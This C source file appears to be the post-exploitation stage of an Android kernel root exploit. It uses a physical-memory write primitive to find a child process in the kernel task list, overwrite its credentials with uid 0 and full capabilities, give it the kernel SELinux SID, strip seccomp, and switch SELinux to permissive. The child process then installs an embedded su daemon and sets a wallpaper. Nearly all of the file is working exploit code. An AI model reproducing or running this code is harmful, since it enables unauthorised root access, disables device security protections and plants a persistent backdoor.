#include "common.h"
#include "runtime_struct_offsets.h"

int root_child_done;
uint8_t selinux_before = 0xff;
uint8_t selinux_after = 0xff;
uint32_t root_uid_before = 0xffffffff;
uint32_t root_uid_after = 0xffffffff;
uint64_t capable_head_before;
uint64_t capable_head_after;
uint64_t init_tasks_prev;
uint64_t last_task_guess;
int setgid_ret = -1;
int setuid_ret = -1;
int setenforce_ret = -1;
int setenforce_errno;
uint64_t current_task_addr;
uint64_t current_cred_addr;
uint64_t current_real_cred_addr;
uint64_t current_cred_security_addr;
uint64_t current_real_cred_security_addr;
uint32_t cred_sid_before = 0xffffffff;
uint32_t cred_sid_after = 0xffffffff;
uint32_t real_cred_sid_before = 0xffffffff;
uint32_t real_cred_sid_after = 0xffffffff;
uint32_t target_cred_osid = SELINUX_KERNEL_SID;
uint32_t target_cred_sid = SELINUX_KERNEL_SID;
uint32_t selinux_cred_blob_off = SELINUX_CRED_BLOB_OFF;
int task_walk_iters;
uint64_t task_walk_last_entry;
uint32_t task_walk_last_pid;
uint32_t task_walk_last_tgid;
uint32_t found_task_pid;
uint32_t found_task_tgid;
char found_task_comm[TASK_COMM_LEN + 1];
pid_t root_child_pid = -1;
int root_ready_pipe[2] = {-1, -1};
struct root_shared *root_shared;

static void cleanup_root_child(void) {
  if (root_child_pid > 0) {
    kill(root_child_pid, SIGKILL);
    waitpid(root_child_pid, NULL, 0);
    root_child_pid = -1;
  }
  for (int i = 0; i < 2; i++) {
    if (root_ready_pipe[i] >= 0) close(root_ready_pipe[i]);
    root_ready_pipe[i] = -1;
  }
  if (root_shared && root_shared != MAP_FAILED) {
    munmap(root_shared, sizeof(*root_shared));
    root_shared = NULL;
  }
}

struct cred_snapshot {
  uintptr_t cred, sid_addr;
  uint64_t ids[4], caps[CRED_CAP_WORDS];
  uint32_t securebits, sid[2];
};

static int snapshot_cred(int fd, uintptr_t cred, struct cred_snapshot *s) {
  uintptr_t security;
  s->cred = cred;
  if (!pipe_phys_read_data(fd, cred + CRED_SECURITY_OFF,
                           &security, sizeof(security)) || !is_direct_ptr(security)) return 0;
  s->sid_addr = security + selinux_cred_blob_off + SELINUX_CRED_OSID_OFF;
  return pipe_phys_read_data(fd, cred + CRED_UID_OFF, s->ids, sizeof(s->ids)) &&
         pipe_phys_read_data(fd, cred + CRED_SECUREBITS_OFF,
                             &s->securebits, sizeof(s->securebits)) &&
         pipe_phys_read_data(fd, cred + CRED_CAPS_OFF, s->caps, sizeof(s->caps)) &&
         pipe_phys_read_data(fd, s->sid_addr, s->sid, sizeof(s->sid));
}

static int restore_cred(int fd, const struct cred_snapshot *s) {
  int ok = 1;
  ok &= pipe_phys_write_data(fd, s->sid_addr, s->sid, sizeof(s->sid));
  ok &= pipe_phys_write_data(fd, s->cred + CRED_CAPS_OFF, s->caps, sizeof(s->caps));
  ok &= pipe_phys_write_data(fd, s->cred + CRED_SECUREBITS_OFF,
                             &s->securebits, sizeof(s->securebits));
  ok &= pipe_phys_write_data(fd, s->cred + CRED_UID_OFF, s->ids, sizeof(s->ids));
  struct cred_snapshot after;
  return ok && snapshot_cred(fd, s->cred, &after) &&
         after.sid_addr == s->sid_addr &&
         memcmp(after.ids, s->ids, sizeof(s->ids)) == 0 &&
         after.securebits == s->securebits &&
         memcmp(after.caps, s->caps, sizeof(s->caps)) == 0 &&
         memcmp(after.sid, s->sid, sizeof(s->sid)) == 0;
}

int spawn_root_child(void) {
  int prot = PROT_READ | PROT_WRITE;
  int flags = MAP_SHARED | MAP_ANONYMOUS;
  root_shared = SYSCHK(mmap(NULL, sizeof(*root_shared), prot, flags, -1, 0));
  memset(root_shared, 0, sizeof(*root_shared));
  SYSCHK(pipe(root_ready_pipe));

  root_child_pid = SYSCHK(fork());
  if (root_child_pid == 0) {
    close(root_ready_pipe[0]);

    prctl(PR_SET_NAME, "ll_root_child");
    char ready = 1;
    SYSCHK(write(root_ready_pipe[1], &ready, sizeof(ready)));

    for (int i = 0; i < 5000; i++) {
      if (atomic_load(&root_shared->go)) {
        break;
      }
      usleep(1000);
    }
    if (!atomic_load(&root_shared->go)) {
      _exit(2);
    }

    struct root_report report;
    memset(&report, 0, sizeof(report));
    report.uid_before = getuid();
    errno = 0;
    report.setgid_ret = setgid(0);
    report.setgid_errno = errno;
    errno = 0;
    report.setuid_ret = setuid(0);
    report.setuid_errno = errno;
    report.uid_after = getuid();
    report.gid_after = getgid();
    report.euid_after = geteuid();
    report.egid_after = getegid();
    int enforce_fd = open("/sys/fs/selinux/enforce", O_WRONLY | O_CLOEXEC);
    if (enforce_fd >= 0) {
      ssize_t wrote = write(enforce_fd, "0", 1);
      report.setenforce_ret = wrote == 1 ? 0 : -1;
      report.setenforce_errno = wrote == 1 ? 0 : errno;
      close(enforce_fd);
    } else {
      report.setenforce_ret = -1;
      report.setenforce_errno = errno;
    }
    report.su_daemon_pid = -1;
    if (report.setgid_ret == 0 && report.setuid_ret == 0) {
      errno = 0;
      report.su_install_ret = install_embedded_su(&report.su_daemon_pid);
      report.su_install_errno = errno;
      errno = 0;
      report.wallpaper_ret = install_embedded_wallpaper();
      report.wallpaper_errno = errno;
    } else {
      report.su_install_ret = 0;
      report.su_install_errno = EPERM;
      report.wallpaper_ret = 0;
      report.wallpaper_errno = EPERM;
    }
    root_shared->report = report;
    atomic_store(&root_shared->done, 1);
    _exit(report.uid_after == 0 ? 0 : 1);
  }

  close(root_ready_pipe[1]);
  root_ready_pipe[1] = -1;

  char ready;
  ssize_t got = read(root_ready_pipe[0], &ready, sizeof(ready));
  return got == (ssize_t)sizeof(ready);
}

int collect_root_child(void) {
  if (!root_shared) {
    return 0;
  }
  atomic_store(&root_shared->go, 1);

  for (int i = 0; i < 5000; i++) {
    if (atomic_load(&root_shared->done)) {
      break;
    }
    usleep(1000);
  }
  if (!atomic_load(&root_shared->done)) {
    return 0;
  }

  struct root_report report = root_shared->report;
  root_uid_after = report.uid_after;
  setgid_ret = report.setgid_ret;
  setuid_ret = report.setuid_ret;
  setenforce_ret = report.setenforce_ret;
  setenforce_errno = report.setenforce_errno;
  waitpid(root_child_pid, NULL, 0);
  root_child_pid = -1;
  return report.uid_after == 0 && report.euid_after == 0 &&
         report.gid_after == 0 && report.egid_after == 0;
}

uint64_t find_task_by_tgid(int fd, uint32_t want_tgid) {
  uint64_t head = data_addr(INIT_TASK_TASKS);
  uint64_t canonical_head = canon_addr(INIT_TASK_TASKS);
  uint64_t entry;
  if (!pipe_phys_read_data(fd, head, &entry, sizeof(entry))) return 0;
  task_walk_iters = 0;
  task_walk_last_entry = 0;
  task_walk_last_pid = 0;
  task_walk_last_tgid = 0;

  for (int i = 0; i < 4096; i++) {
    task_walk_iters = i + 1;
    task_walk_last_entry = entry;
    if (entry == canonical_head || entry == head) {
      break;
    }
    if (!is_direct_ptr(entry)) {
      break;
    }

    uint64_t task = entry - TASK_TASKS_OFF;
    uint32_t pid, tgid;
    if (!pipe_phys_read_data(fd, task + TASK_PID_OFF, &pid, sizeof(pid)) ||
        !pipe_phys_read_data(fd, task + TASK_TGID_OFF, &tgid, sizeof(tgid))) return 0;
    task_walk_last_pid = pid;
    task_walk_last_tgid = tgid;
    char comm[TASK_COMM_LEN + 1];
    memset(comm, 0, sizeof(comm));
    pipe_phys_read_data(fd, task + TASK_COMM_OFF, comm, TASK_COMM_LEN);

    if (tgid == want_tgid || pid == want_tgid) {
      found_task_pid = pid;
      found_task_tgid = tgid;
      memcpy(found_task_comm, comm, sizeof(found_task_comm));
      return task;
    }

    if (!pipe_phys_read_data(fd, task + TASK_TASKS_OFF, &entry, sizeof(entry))) return 0;
  }

  return 0;
}

int patch_cred_identity(int fd, uintptr_t cred) {
  if (!is_direct_ptr(cred)) {
    return 0;
  }

  uint64_t zero_ids[4] = {0};
  if (!pipe_phys_write_data(fd, cred + CRED_UID_OFF, zero_ids, sizeof(zero_ids))) {
    return 0;
  }

  uint32_t securebits = 0;
  if (!pipe_phys_write_data(
      fd, cred + CRED_SECUREBITS_OFF, &securebits, sizeof(securebits))) {
    return 0;
  }

  uint64_t caps[CRED_CAP_WORDS] = {
    CAP_FULL, CAP_FULL, CAP_FULL, CAP_FULL, CAP_FULL,
  };
  if (!pipe_phys_write_data(fd, cred + CRED_CAPS_OFF, caps, sizeof(caps))) {
    return 0;
  }

  uint64_t caps_after[CRED_CAP_WORDS] = {0};
  if (!pipe_phys_read_data(
      fd, cred + CRED_CAPS_OFF, caps_after, sizeof(caps_after))) {
    return 0;
  }
  for (size_t i = 0; i < CRED_CAP_WORDS; i++) {
    if (caps_after[i] != CAP_FULL) {
      pr_info("root cap verify failed cred=%016llx idx=%zu got=%016llx want=%016llx\n",
              (unsigned long long)cred, i, (unsigned long long)caps_after[i],
              (unsigned long long)CAP_FULL);
      return 0;
    }
  }

  return 1;
}

int patch_cred_sid(int fd, uintptr_t cred) {
  uint64_t security;
  if (!pipe_phys_read_data(fd, cred + CRED_SECURITY_OFF,
                           &security, sizeof(security))) return 0;
  if (!is_direct_ptr(security)) {
    pr_info("root bad cred security cred=%016llx security=%016llx\n",
            (unsigned long long)cred, (unsigned long long)security);
    return 0;
  }

  uint32_t sid_pair[2] = {
    target_cred_osid, target_cred_sid,
  };
  uintptr_t osid_addr =
    security + selinux_cred_blob_off + SELINUX_CRED_OSID_OFF;
  return pipe_phys_write_data(fd, osid_addr, sid_pair, sizeof(sid_pair));
}

int patch_cred_object(int fd, uintptr_t cred) {
  return patch_cred_identity(fd, cred) && patch_cred_sid(fd, cred);
}

int patch_task_seccomp(int fd, uintptr_t task) {
  if (!is_direct_ptr(task)) {
    return 0;
  }

  uintptr_t flags_addr = task + TASK_THREAD_INFO_FLAGS_OFF;
  uintptr_t atomic_flags_addr = task + TASK_ATOMIC_FLAGS_OFF;
  uintptr_t seccomp_addr = task + TASK_SECCOMP_OFF;

  uint64_t flags_before, atomic_before, filter_before;
  uint32_t mode_before, count_before;
  if (!pipe_phys_read_data(fd, flags_addr, &flags_before, sizeof(flags_before)) ||
      !pipe_phys_read_data(fd, atomic_flags_addr, &atomic_before, sizeof(atomic_before)) ||
      !pipe_phys_read_data(fd, seccomp_addr + SECCOMP_MODE_OFF, &mode_before, sizeof(mode_before)) ||
      !pipe_phys_read_data(fd, seccomp_addr + SECCOMP_FILTER_COUNT_OFF, &count_before, sizeof(count_before)) ||
      !pipe_phys_read_data(fd, seccomp_addr + SECCOMP_FILTER_OFF, &filter_before, sizeof(filter_before))) return 0;

  uint64_t flags_want = flags_before & ~(1ULL << TIF_SECCOMP_BIT);
  uint64_t atomic_want = atomic_before & ~(1ULL << PFA_NO_NEW_PRIVS_BIT);
  uint32_t zero32 = 0;
  uint64_t zero64 = 0;

  if (flags_want != flags_before && !pipe_write64(fd, flags_addr, flags_want)) goto rollback;
  if (atomic_want != atomic_before && !pipe_write64(fd, atomic_flags_addr, atomic_want)) goto rollback;
  if (!pipe_phys_write_data(fd, seccomp_addr + SECCOMP_MODE_OFF,
                            &zero32, sizeof(zero32))) goto rollback;
  if (!pipe_phys_write_data(fd, seccomp_addr + SECCOMP_FILTER_COUNT_OFF,
                            &zero32, sizeof(zero32))) goto rollback;
  if (!pipe_phys_write_data(fd, seccomp_addr + SECCOMP_FILTER_OFF,
                            &zero64, sizeof(zero64))) goto rollback;

  uint64_t flags_after, atomic_after, filter_after;
  uint32_t mode_after, count_after;
  if (!pipe_phys_read_data(fd, flags_addr, &flags_after, sizeof(flags_after)) ||
      !pipe_phys_read_data(fd, atomic_flags_addr, &atomic_after, sizeof(atomic_after)) ||
      !pipe_phys_read_data(fd, seccomp_addr + SECCOMP_MODE_OFF, &mode_after, sizeof(mode_after)) ||
      !pipe_phys_read_data(fd, seccomp_addr + SECCOMP_FILTER_COUNT_OFF, &count_after, sizeof(count_after)) ||
      !pipe_phys_read_data(fd, seccomp_addr + SECCOMP_FILTER_OFF, &filter_after, sizeof(filter_after))) goto rollback;

  pr_info("root seccomp patched ok=%d flags=%016llx/%016llx "
          "atomic=%016llx/%016llx mode=%u/%u count=%u/%u "
          "filter=%016llx/%016llx\n",
          1, (unsigned long long)flags_before,
          (unsigned long long)flags_after,
          (unsigned long long)atomic_before,
          (unsigned long long)atomic_after, mode_before, mode_after,
          count_before, count_after, (unsigned long long)filter_before,
          (unsigned long long)filter_after);

  int tif_clear = (flags_after & (1ULL << TIF_SECCOMP_BIT)) == 0;
  int nnp_clear = (atomic_after & (1ULL << PFA_NO_NEW_PRIVS_BIT)) == 0;
  if (tif_clear && nnp_clear && mode_after == 0 &&
      count_after == 0 && filter_after == 0) return 1;

rollback:
  ;
  int restored = 1;
  restored &= pipe_phys_write_data(fd, seccomp_addr + SECCOMP_FILTER_OFF,
                                   &filter_before, sizeof(filter_before));
  restored &= pipe_phys_write_data(fd, seccomp_addr + SECCOMP_FILTER_COUNT_OFF,
                                   &count_before, sizeof(count_before));
  restored &= pipe_phys_write_data(fd, seccomp_addr + SECCOMP_MODE_OFF,
                                   &mode_before, sizeof(mode_before));
  restored &= pipe_write64(fd, atomic_flags_addr, atomic_before);
  restored &= pipe_write64(fd, flags_addr, flags_before);
  uint64_t verify_flags, verify_atomic, verify_filter;
  uint32_t verify_mode, verify_count;
  restored = restored &&
      pipe_phys_read_data(fd, flags_addr, &verify_flags, sizeof(verify_flags)) &&
      pipe_phys_read_data(fd, atomic_flags_addr, &verify_atomic, sizeof(verify_atomic)) &&
      pipe_phys_read_data(fd, seccomp_addr + SECCOMP_MODE_OFF,
                          &verify_mode, sizeof(verify_mode)) &&
      pipe_phys_read_data(fd, seccomp_addr + SECCOMP_FILTER_COUNT_OFF,
                          &verify_count, sizeof(verify_count)) &&
      pipe_phys_read_data(fd, seccomp_addr + SECCOMP_FILTER_OFF,
                          &verify_filter, sizeof(verify_filter)) &&
      verify_flags == flags_before && verify_atomic == atomic_before &&
      verify_mode == mode_before && verify_count == count_before &&
      verify_filter == filter_before;
  if (!restored) pr_error("root seccomp restore unverified task=%016zx\n", task);
  return 0;
}

int install_android_root(int fd) {
  int selinux_direct_ok = 0;
  int selinux_write_attempted = 0;
  selinux_after = 0xff;
  root_child_done = 0;
  struct cred_snapshot cred_saved[2];
  int cred_saved_count = 0;
  int cred_dirty = 0;
  root_uid_before = getuid();
  if (!spawn_root_child()) {
    pr_info("root spawn failed child=%d\n", root_child_pid);
    goto fail;
  }

  uintptr_t selinux_addr = data_addr(SELINUX_ENFORCING);
  if (!pipe_phys_read_data(fd, selinux_addr, &selinux_before, sizeof(selinux_before)) ||
      !pipe_phys_read_data(fd, data_addr(SELINUX_BLOB_SIZES),
                           &selinux_cred_blob_off, sizeof(selinux_cred_blob_off))) goto fail;
  target_cred_osid = SELINUX_KERNEL_SID;
  target_cred_sid = SELINUX_KERNEL_SID;

  if (!pipe_phys_read_data(fd, data_addr(INIT_TASK_TASKS) + 8,
                           &init_tasks_prev, sizeof(init_tasks_prev))) goto fail;
  if (!is_direct_ptr(current_task_addr)) {
    current_task_addr = 0;
  }

  if (!is_direct_ptr(init_tasks_prev)) {
    pr_info("root bad init_tasks_prev=%016llx\n",
            (unsigned long long)init_tasks_prev);
    goto fail;
  }
  current_task_addr = init_tasks_prev - TASK_TASKS_OFF;
  last_task_guess = current_task_addr;

  if (!pipe_phys_read_data(fd, current_task_addr + TASK_PID_OFF,
                           &found_task_pid, sizeof(found_task_pid)) ||
      !pipe_phys_read_data(fd, current_task_addr + TASK_TGID_OFF,
                           &found_task_tgid, sizeof(found_task_tgid))) goto fail;
  memset(found_task_comm, 0, sizeof(found_task_comm));
  pipe_phys_read_data(
      fd, current_task_addr + TASK_COMM_OFF, found_task_comm, TASK_COMM_LEN);
  if (found_task_tgid != (uint32_t)root_child_pid) {
    current_task_addr = find_task_by_tgid(fd, (uint32_t)root_child_pid);
    if (!is_direct_ptr(current_task_addr)) {
      pr_info("root task walk failed want=%u iters=%d last=%016llx pid=%u tgid=%u\n",
              (uint32_t)root_child_pid, task_walk_iters,
              (unsigned long long)task_walk_last_entry, task_walk_last_pid,
              task_walk_last_tgid);
      goto fail;
    }
  }

  uintptr_t real_cred_slot = current_task_addr + TASK_REAL_CRED_OFF;
  if (!pipe_phys_read_data(fd, real_cred_slot, &current_real_cred_addr,
                           sizeof(current_real_cred_addr)) ||
      !pipe_phys_read_data(fd, current_task_addr + TASK_CRED_OFF,
                           &current_cred_addr, sizeof(current_cred_addr)) ||
      !is_direct_ptr(current_cred_addr) ||
      !is_direct_ptr(current_real_cred_addr)) goto fail;
  uintptr_t cred_security_slot = current_cred_addr + CRED_SECURITY_OFF;
  uintptr_t real_security_slot = current_real_cred_addr + CRED_SECURITY_OFF;
  if (!pipe_phys_read_data(fd, cred_security_slot, &current_cred_security_addr,
                           sizeof(current_cred_security_addr)) ||
      !pipe_phys_read_data(fd, real_security_slot, &current_real_cred_security_addr,
                           sizeof(current_real_cred_security_addr))) goto fail;
  uintptr_t sid_off = selinux_cred_blob_off + SELINUX_CRED_SID_OFF;
  if (is_direct_ptr(current_cred_security_addr)) {
    uintptr_t sid_addr = current_cred_security_addr + sid_off;
    cred_sid_before = pipe_read32(fd, sid_addr);
  }
  if (is_direct_ptr(current_real_cred_security_addr)) {
    uintptr_t sid_addr = current_real_cred_security_addr + sid_off;
    real_cred_sid_before = pipe_read32(fd, sid_addr);
  }
  uint64_t cred_caps_before[CRED_CAP_WORDS] = {0};
  uint64_t real_caps_before[CRED_CAP_WORDS] = {0};
  if (!pipe_phys_read_data(fd, current_cred_addr + CRED_CAPS_OFF,
                           cred_caps_before, sizeof(cred_caps_before)) ||
      !pipe_phys_read_data(fd, current_real_cred_addr + CRED_CAPS_OFF,
                           real_caps_before, sizeof(real_caps_before))) goto fail;
  if (!snapshot_cred(fd, current_cred_addr, &cred_saved[0])) goto fail;
  cred_saved_count = 1;
  if (current_real_cred_addr != current_cred_addr) {
    if (!snapshot_cred(fd, current_real_cred_addr, &cred_saved[1])) goto fail;
    cred_saved_count = 2;
  }
  cred_dirty = 1;
  if (!patch_cred_object(fd, current_cred_addr)) {
    pr_info("root patch cred failed cred=%016llx\n",
            (unsigned long long)current_cred_addr);
    goto fail;
  }
  if (current_real_cred_addr != current_cred_addr &&
      !patch_cred_object(fd, current_real_cred_addr)) {
    pr_info("root patch real_cred failed real=%016llx\n",
            (unsigned long long)current_real_cred_addr);
    goto fail;
  }

  if (!patch_task_seccomp(fd, current_task_addr)) {
    pr_info("root patch seccomp failed task=%016llx\n",
            (unsigned long long)current_task_addr);
    goto fail;
  }

  uint32_t cred_uid_after = pipe_read32(fd, current_cred_addr + CRED_UID_OFF);
  uint32_t real_uid_after =
    pipe_read32(fd, current_real_cred_addr + CRED_UID_OFF);
  uint64_t cred_caps_after[CRED_CAP_WORDS] = {0};
  uint64_t real_caps_after[CRED_CAP_WORDS] = {0};
  pipe_phys_read_data(
      fd, current_cred_addr + CRED_CAPS_OFF, cred_caps_after,
      sizeof(cred_caps_after));
  pipe_phys_read_data(
      fd, current_real_cred_addr + CRED_CAPS_OFF, real_caps_after,
      sizeof(real_caps_after));
  if (is_direct_ptr(current_cred_security_addr)) {
    uintptr_t sid_addr = current_cred_security_addr + sid_off;
    cred_sid_after = pipe_read32(fd, sid_addr);
  }
  if (is_direct_ptr(current_real_cred_security_addr)) {
    uintptr_t sid_addr = current_real_cred_security_addr + sid_off;
    real_cred_sid_after = pipe_read32(fd, sid_addr);
  }
  pr_info("root cred patched uid=%u/%u sid=%u/%u\n", cred_uid_after,
          real_uid_after, cred_sid_after, real_cred_sid_after);
  pr_info("root caps patched cred eff=%016llx/%016llx prm=%016llx/%016llx "
          "amb=%016llx/%016llx bset=%016llx/%016llx real_eff=%016llx/%016llx\n",
          (unsigned long long)cred_caps_before[CRED_CAP_EFFECTIVE],
          (unsigned long long)cred_caps_after[CRED_CAP_EFFECTIVE],
          (unsigned long long)cred_caps_before[CRED_CAP_PERMITTED],
          (unsigned long long)cred_caps_after[CRED_CAP_PERMITTED],
          (unsigned long long)cred_caps_before[CRED_CAP_AMBIENT],
          (unsigned long long)cred_caps_after[CRED_CAP_AMBIENT],
          (unsigned long long)cred_caps_before[CRED_CAP_BSET],
          (unsigned long long)cred_caps_after[CRED_CAP_BSET],
          (unsigned long long)real_caps_before[CRED_CAP_EFFECTIVE],
          (unsigned long long)real_caps_after[CRED_CAP_EFFECTIVE]);

  uint8_t permissive = 0;
  selinux_write_attempted = 1;
  selinux_direct_ok =
    pipe_phys_write_data(fd, selinux_addr, &permissive, sizeof(permissive));
  uint8_t selinux_mid = 0xff;
  pipe_phys_read_data(fd, selinux_addr, &selinux_mid, sizeof(selinux_mid));
  pr_info("root selinux direct write ok=%d %u->%u\n", selinux_direct_ok,
          selinux_before, selinux_mid);

  capable_head_before = pipe_read64(fd, data_addr(SECURITY_CAPABLE_HEAD));
  root_child_done = collect_root_child();
  cred_saved_count = 0; /* child has run; its credentials may be freed */
  struct root_report report;
  memset(&report, 0, sizeof(report));
  if (root_shared) {
    report = root_shared->report;
  }
  capable_head_after = pipe_read64(fd, data_addr(SECURITY_CAPABLE_HEAD));
  if (!pipe_phys_read_data(fd, selinux_addr, &selinux_after, sizeof(selinux_after)))
    goto fail;
  pr_info("root child result done=%d uid_after=%u setgid=%d/%d setuid=%d/%d "
          "setenforce=%d/%d su=%d/%d daemon=%d wallpaper=%d/%d selinux=%u->%u "
          "cap=%016llx/%016llx\n",
          root_child_done, root_uid_after, report.setgid_ret,
          report.setgid_errno, report.setuid_ret, report.setuid_errno,
          setenforce_ret, setenforce_errno, report.su_install_ret,
          report.su_install_errno, report.su_daemon_pid, report.wallpaper_ret,
          report.wallpaper_errno,
          selinux_before, selinux_after,
          (unsigned long long)capable_head_before,
          (unsigned long long)capable_head_after);
  int success = root_child_done && selinux_after == 0;
  if (!success) goto fail;
  cleanup_root_child();
  return 1;

fail:
  for (int i = cred_dirty ? cred_saved_count - 1 : -1; i >= 0; i--) {
    if (!restore_cred(fd, &cred_saved[i]))
      pr_error("root failure: cred restore unverified cred=%016zx\n", cred_saved[i].cred);
  }
  if (selinux_write_attempted && selinux_before <= 1) {
    uint8_t restored = 0xff;
    if (!pipe_phys_write_data(fd, data_addr(SELINUX_ENFORCING),
                              &selinux_before, sizeof(selinux_before)) ||
        !pipe_phys_read_data(fd, data_addr(SELINUX_ENFORCING),
                             &restored, sizeof(restored)) ||
        restored != selinux_before)
      pr_error("root failure: SELinux state restore unverified\n");
  }
  cleanup_root_child();
  return 0;
}
